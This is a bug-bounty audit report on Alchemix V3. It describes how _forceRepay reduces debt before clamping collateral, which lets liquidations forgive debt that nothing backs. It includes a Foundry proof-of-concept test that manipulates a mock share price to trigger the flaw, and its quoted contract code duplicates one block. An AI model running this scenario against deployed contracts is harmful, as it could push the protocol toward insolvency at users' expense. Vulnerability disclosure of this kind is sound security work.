# 56719 sc high the function forcerepay reduces debt before clamp creating unbacked loan forgiveness and protocol insolvency

**Submitted on Oct 19th 2025 at 21:34:47 UTC by @Cryptor for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56719
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value
  * Protocol insolvency

## Description

## Brief/Intro

The function \_forcerepay reduces debt before clamp, creating unbacked loan forgiveness and protocol insolvency

## Vulnerability Details

The function \_forcerepay is called during liquidation that forces a repay of debt is there is any earmarked debt shown here

```
    /**
     * @notice Force repays earmarked debt of the account owned by `accountId` using account's collateral balance.
     * @param accountId The tokenId of the account to repay from.
     * @param amount The amount to repay in debt tokens.
     * @return creditToYield The amount of yield tokens repaid.
     */
    function _forceRepay(uint256 accountId, uint256 amount) internal returns (uint256) {
        if (amount == 0) {
            return 0;
        }
        _checkForValidAccountId(accountId);
        Account storage account = _accounts[accountId];

        // Query transmuter and earmark global debt
        _earmark();

        // Sync current user debt before deciding how much is available to be repaid
        _sync(accountId);

        uint256 debt;

        // Burning yieldTokens will pay off all types of debt
        _checkState((debt = account.debt) > 0);

        uint256 credit = amount > debt ? debt : amount;
        uint256 creditToYield = convertDebtTokensToYield(credit);
        _subDebt(accountId, credit);

        // Repay debt from earmarked amount of debt first
        uint256 earmarkToRemove = credit > account.earmarked ? account.earmarked : credit;
        account.earmarked -= earmarkToRemove;

 // Repay debt from earmarked amount of debt first
        uint256 earmarkToRemove = credit > account.earmarked ? account.earmarked : credit;
        account.earmarked -= earmarkToRemove;

        creditToYield = creditToYield > account.collateralBalance ? account.collateralBalance : creditToYield;
        account.collateralBalance -= creditToYield;

...
```

The problem lies here

```
 creditToYield = creditToYield > account.collateralBalance ? account.collateralBalance : creditToYield;
        account.collateralBalance -= creditToYield;

```

After reducing the debt from calling the function subdebt, the function then applies a clamp to the creditToYield function; Here, creditToYield = min(convertDebtTokensToYield(credit), account.collateralBalance). It only stays unchanged when collateralBalance >= needed yield; otherwise it’s reduced.

It is important to note that at this point, debt has already been burned via \_subDebt(credit) before this clamp and transfer, enabling unbacked forgiveness.

The problem with this is that under certain circumstances this allows loans with low collateral to have their debt erased while transferring little to no tokens to the transmuter.

## Impact Details

Insolvency drift: totalDebt decreases without a matching asset inflow to the transmuter, lowering system collateralization and pushing the protocol toward insolvency.

Liquidator disincentive and liveness risk: Liquidators receive little or no assets in these scenarios, removing economic incentives to liquidate and allowing unhealthy positions to persist.

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L738-L783>

## Proof of Concept

## Proof of Concept

paste this code in src/test/AlchemistV3.t.sol

```
function test_Vulnerability_UnbackedDebtForgiveness() external {
        // Isolate accounting (no fees interfering with transfers)
        vm.prank(alchemist.admin());
        alchemist.setProtocolFee(0);
        vm.prank(alchemist.admin());
        alchemist.setRepaymentFee(0);

        // 1) Setup: deposit and mint
        address victim = address(0xbeef);
        uint256 initialDeposit = 200e18;
        uint256 mintAmount = 100e18;

        vm.startPrank(victim);
        SafeERC20.safeApprove(address(vault), address(alchemist), type(uint256).max);
        alchemist.deposit(initialDeposit, victim, 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(victim, address(alchemistNFT));
        alchemist.mint(tokenId, mintAmount, victim);
        vm.stopPrank();

        // 2) Earmark the victim's debt fully via a redemption
        deal(address(alToken), address(0xdad), mintAmount);
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();
        vm.roll(block.number + 5_256_000); // let earmark fully mature

        // Snapshot before price drop
        (uint256 collateralBefore, uint256 debtBefore, ) = alchemist.getCDP(tokenId);
        uint256 totalDebtBefore = alchemist.totalDebt();
        uint256 transmuterBalanceBefore = IERC20(address(vault)).balanceOf(address(transmuterLogic));

       
        // 3) Make repayment in shares unaffordable: drop share price hard
        // Increasing vault share supply simulates a drop in share price (assets/share down)
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // Drop price by just over 50% (increase supply by >100% of initial so requiredShares > collateralBefore)
        uint256 modifiedVaultSupply = (initialVaultSupply * 2) + 1;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // Sanity: required shares to repay full debt now exceed available collateral
        uint256 requiredShares = alchemist.convertDebtTokensToYield(debtBefore);
        require(requiredShares > collateralBefore, "price drop insufficient to trigger clamp");

      
        // 4) Trigger liquidation -> calls _forceRepay(earmarked) first
        vm.prank(externalUser);
        (uint256 assetsLiquidated,,) = alchemist.liquidate(tokenId);

        // 5) Post state
        ( , uint256 debtAfter, ) = alchemist.getCDP(tokenId);
        uint256 totalDebtAfter = alchemist.totalDebt();
        uint256 transmuterBalanceAfter = IERC20(address(vault)).balanceOf(address(transmuterLogic));

        // Debt is fully erased even though not enough shares were transferred (vulnerability)
        assertEq(debtAfter, 0, "debt should be wiped");
        assertEq(totalDebtAfter, totalDebtBefore - debtBefore, "global debt reduced by full user debt");

        // Only the available collateral was actually sent (clamped), no additional liquidation occurs
        assertEq(assetsLiquidated, collateralBefore, "only available shares moved to transmuter");
        assertEq(transmuterBalanceAfter, transmuterBalanceBefore + collateralBefore, "transmuter got clamped amount");

        require(requiredShares > assetsLiquidated, "expected shortfall not realized");
        assertEq(assetsLiquidated, collateralBefore, "clamped to available shares");
        assertEq( IERC20(address(vault)).balanceOf(address(transmuterLogic)),transmuterBalanceBefore + assetsLiquidated,
        "transmuter got only clamped amount");
    }
```
